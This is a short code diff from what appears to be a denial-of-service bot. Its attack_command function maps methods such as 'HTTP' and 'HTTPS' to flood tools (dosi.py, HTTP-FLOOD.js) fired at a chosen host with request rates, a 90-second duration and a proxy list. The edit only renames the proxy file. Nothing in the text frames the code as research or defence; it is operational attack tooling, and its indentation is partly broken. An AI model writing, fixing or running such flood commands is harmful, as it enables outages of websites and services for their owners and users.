@@ -291,7 +291,7 @@ def attack_command(message):
         command = ["python", "dosi.py","browser", host, "443","1000","1000"]
             duration = 90
         elif method == 'HTTP':
-            command = ["node", "HTTP-FLOOD.js", host, "300", "5", "90", "proxy1.txt"]
+            command = ["node", "HTTP-FLOOD.js", host, "300", "5", "90", "proxy.txt"]
             duration = 90
         elif method == 'HTTPS':
             command = ["python", "dosi.py","https", host, "443","1000","1000"]
